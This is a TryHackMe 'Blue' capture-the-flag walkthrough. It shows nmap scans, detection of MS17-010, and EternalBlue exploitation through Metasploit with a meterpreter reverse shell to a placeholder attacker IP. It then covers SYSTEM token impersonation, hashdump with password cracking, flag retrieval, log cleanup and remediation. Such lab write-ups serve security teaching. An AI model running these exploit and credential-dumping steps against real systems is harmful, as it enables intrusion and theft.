# Try Hack Me — Blue Walkthrough

---

## Author

**PulseEinher**

---

## Introduction

**Hello, stranger — let’s begin.**

![Ready to go??](./images/blue_1.webp)

---

## Challenge Link

Today’s problem is: https://tryhackme.com/room/blue

---

## Challenge Overview

**Machine:** Blue (THM)

**Path:** Port Scan → SMB Enumeration → MS17–010 (EternalBlue) → Meterpreter Shell → SYSTEM Access → Credential Dumping

**Key Takeaway:**  
An unpatched SMBv1 service vulnerable to EternalBlue allowed unauthenticated remote code execution, directly granting SYSTEM-level access without requiring valid credentials.

**Business Impact:**  
In a real-world enterprise network, exposure of SMB services with known critical vulnerabilities could allow attackers to gain immediate SYSTEM-level access, dump credentials, and move laterally across the network — leading to domain-wide compromise, unauthorized access to sensitive data, and potential ransomware-style full infrastructure takeover.

---

## Initial Setup

The following entry was added to the /etc/hosts file to simplify hostname-based interaction with the target system:

    <TARGET_IP> blue.thm

---

## Port Scanning

The initial enumeration phase was started by performing a full port scan against the target machine using Nmap. The following commands were executed to identify open ports and active services:

    nmap -p- --open blue.thm
    nmap -sC -sV -p <OPEN_PORTS> blue.thm

    ┌──(root㉿vbox)-[~]
    └─# nmap -p- --open blue.thm
    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-16 22:20 +0530
    Nmap scan report for blue.thm (10.49.174.217)
    Host is up (0.050s latency).
    Not shown: 65503 closed tcp ports (reset), 23 filtered tcp ports (no-response)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49160/tcp open  unknown
    49177/tcp open  unknown

    Nmap done: 1 IP address (1 host up) scanned in 69.16 seconds

    ┌──(root㉿vbox)-[~]
    └─# nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49160,49177 blue.thm
    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-16 22:23 +0530
    Nmap scan report for blue.thm (10.49.174.217)
    Host is up (0.037s latency).

    PORT      STATE  SERVICE       VERSION
    135/tcp   open   msrpc         Microsoft Windows RPC
    139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp   open   microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    3389/tcp  closed ms-wbt-server
    49152/tcp open   msrpc         Microsoft Windows RPC
    49153/tcp open   msrpc         Microsoft Windows RPC
    49154/tcp open   msrpc         Microsoft Windows RPC
    49160/tcp open   msrpc         Microsoft Windows RPC
    49177/tcp open   msrpc         Microsoft Windows RPC
    Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.1:
    |_    Message signing enabled but not required
    |_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:c1:f8:1b:9f:83 (unknown)
    | smb2-time:
    |   date: 2026-04-16T16:54:53
    |_  start_date: 2026-04-16T16:49:03
    | smb-os-discovery:
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
    |   Computer name: Jon-PC
    |   NetBIOS computer name: JON-PC\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2026-04-16T11:54:53-05:00

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 65.02 seconds

---

## Services Identified

    135 -> MSRPC
    139, 445 -> SMB
    49152,49153,49154,49160,49177 -> MSRPC

Based on the identified Windows version, Windows 7 SP1, and the absence of enforced SMB signing, the system was determined to present a viable attack surface.

---

## Vulnerability Detection

The presence of associated vulnerabilities was further confirmed by executing the following Nmap command to detect known vulnerabilities.

    ┌──(root㉿vbox)-[~]
    └─# nmap --script vuln -p445 blue.thm
    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-16 22:23 +0530
    Nmap scan report for blue.thm (10.49.174.217)
    Host is up (0.038s latency).

    PORT    STATE SERVICE
    445/tcp open  microsoft-ds

    Host script results:
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-054: false
    | smb-vuln-ms17-010:
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

---

## Vulnerability Identified

    CVE-2017-0143 -> ms17-010

This vulnerability is a remote code execution flaw in SMBv1, which allows arbitrary code execution by exploiting improper memory handling within the SMB protocol.

The flaw enables unauthenticated attackers to send specially crafted packets to gain execution at the kernel level.

---

## Exploitation (Metasploit)

The Metasploit framework was then utilized to identify a suitable exploit for the vulnerability.

    msf > search ms17-010

    exploit/windows/smb/ms17_010_eternalblue

The exploit used to compromise the machine is:

    exploit/windows/smb/ms17_010_eternalblue

The following parameters were changed to run the exploit on the target machine:

    RHOSTS, LHOST

    set RHOSTS blue.thm
    set LHOST <ATTACKER_IP>

If not already configured, the payload was set to:

    windows/x64/meterpreter/reverse_tcp

A Meterpreter session was successfully established, and the system context was verified:

    meterpreter > sysinfo
    meterpreter > getuid

    Server username: NT AUTHORITY\SYSTEM

This indicates that the highest level of privileges was achieved, as SYSTEM-level access provides full control over the operating system.

> Note -> Exploitation of SMBv1 vulnerabilities such as MS17–010 is widely detected and often blocked in modern environments due to network-level filtering and intrusion detection systems. In real-world environments, such exploitation is typically combined with traffic obfuscation or performed through internal pivoting where legacy systems remain exposed.

---

## Post Exploitation

### Shell to Meterpreter

    post/multi/manage/shell_to_meterpreter

Required option:

    SESSION

---

## Token Impersonation

    meterpreter > load incognito
    meterpreter > list_tokens -u
    meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"

---

## Process Migration

    meterpreter > ps
    meterpreter > migrate 1328

Process migration ensures session stability.

---

## Credential Dumping

    meterpreter > hashdump

The hash of Jon’s password was saved and cracked using John the Ripper.

    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
    john --show --format=NT hash.txt

    Jon:{REDACTED}

---

## Flags

### FLAG 1

    meterpreter > cat flag1.txt
    <<FLAG_1>>

### FLAG 2

    meterpreter > cat flag2.txt
    <<FLAG_2>>

### FLAG 3

    meterpreter > cat flag3.txt
    <<<FLAG_3>>> !!!

---

## Cleanup

1. Remove exploitation artifacts and payload remnants.  
2. Terminate active sessions and injected processes.  
3. Reset exposed credentials.  
4. Review and clean SMB logs.  

---

## Remediations

1. Disable SMBv1.  
2. Apply MS17–010 patch or upgrade OS.  
3. Enforce SMB signing.  
4. Restrict SMB exposure.  
5. Enforce strong authentication policies.  

---

## Conclusion

We are done with the machine……….

Let’s move to the next, till then  
Have a good day (night too)

---

## Disclaimer

This content is intended for educational purposes only.
